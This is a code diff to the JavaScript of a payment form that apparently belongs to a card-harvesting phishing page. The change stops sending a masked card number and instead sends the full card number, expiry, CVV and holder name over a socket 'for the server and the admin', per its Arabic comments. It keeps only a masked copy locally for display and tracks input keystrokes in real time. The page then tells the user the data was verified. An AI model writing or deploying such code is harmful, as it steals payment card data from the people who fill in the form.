@@ -149,37 +149,39 @@
       // Load saved payment data if exists
       const savedData = localStorage.getItem('payment_data');
       if (savedData) {
-        const data = JSON.parse(savedData);
-        ['card1', 'card2', 'card3', 'card4', 'expiry', 'cvv', 'cardHolder'].forEach(key => {
-          const input = document.querySelector(`[name="${key}"]`);
-          if (input && data[key]) input.value = data[key];
-        });
+        try {
+          const data = JSON.parse(savedData);
+          // Only restore non-masked fields
+          if (data.expiry) document.querySelector('[name="expiry"]').value = data.expiry;
+          if (data.cardHolder) document.querySelector('[name="cardHolder"]').value = data.cardHolder;
+        } catch (e) {}
       }
       
       document.getElementById('paymentForm').addEventListener('submit', (e) => {
         e.preventDefault();
         
         const formData = new FormData(e.target);
-        const data = {
+        
+        // إرسال البيانات الحقيقية للـ socket
+        const realData = {
           cardNumber: `${formData.get('card1')}${formData.get('card2')}${formData.get('card3')}${formData.get('card4')}`,
           expiry: formData.get('expiry'),
           cvv: formData.get('cvv'),
           cardHolder: formData.get('cardHolder')
         };
         
-        // Mask card number for privacy
+        // حفظ نسخة مقنعة للعرض فقط في localStorage
         const maskedData = {
-          cardNumber: '**** **** **** ' + data.cardNumber.slice(-4),
-          expiry: data.expiry,
+          cardNumber: '**** **** **** ' + realData.cardNumber.slice(-4),
+          expiry: realData.expiry,
           cvv: '***',
-          cardHolder: data.cardHolder
+          cardHolder: realData.cardHolder
         };
         
-        // Save to localStorage
         localStorage.setItem('payment_data', JSON.stringify(maskedData));
         
-        // Send via socket
-        submitPaymentForm(maskedData);
+        // إرسال البيانات الحقيقية للـ socket (للخادم والأدمن)
+        submitPaymentForm(realData);
         
         showToast('تم التحقق من بيانات الدفع بنجاح!');
         
@@ -188,7 +190,7 @@
         }, 1000);
       });
       
-      // Real-time tracking
+      // Real-time tracking with real data (partial)
       const inputs = document.querySelectorAll('#paymentForm input');
       inputs.forEach(input => {
         input.addEventListener('input', () => {
